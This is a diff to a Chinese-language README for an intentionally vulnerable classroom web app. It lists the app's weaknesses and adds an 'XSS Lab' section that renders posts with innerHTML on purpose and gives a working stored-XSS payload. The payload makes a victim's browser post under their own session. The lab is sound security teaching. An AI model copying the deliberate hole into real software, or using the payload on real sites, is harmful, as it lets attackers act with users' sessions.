@@ -62,11 +62,24 @@ docker compose up --build
 - Session token 是可預測的 `token-1`、`token-2`
 - Cookie 沒有設定 `HttpOnly`，所以前端 JavaScript 可以讀到
 - 沒有 CSRF 防護
+- 貼文與留言內容會被當成 HTML 插入頁面，因此預設可以示範 stored XSS
 - 沒有 rate limit
 - 沒有 HTTPS
 - 沒有正式資料庫與 migration
 
 正式服務至少要改成密碼雜湊、不可預測的高熵 session token、合適的 Cookie 屬性、HTTPS、CSRF 防護與更完整的授權檢查。
+
+## XSS Lab
+
+這個 demo 預設會刻意用 `innerHTML` 顯示貼文與留言內容，讓課堂可以示範「一個人發了惡意貼文，其他登入使用者載入時間線時，瀏覽器自動用自己的 session 發出 request」。
+
+只在課堂 demo 帳號使用，不要拿真實帳號或其他網站操作。下面 payload 會在受害者第一次載入該貼文時，用受害者自己的 session 發一篇貼文：
+
+```html
+<img src=x onerror="if(!sessionStorage.x){sessionStorage.x=1;fetch('/api/posts',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'XSS demo: this post used my session'})})}">
+```
+
+如果想確認 HTML 會被解析，可以先發 `<h1>Test</h1>`。它應該會變成標題，而不是顯示原始文字。
 
 ## API
 
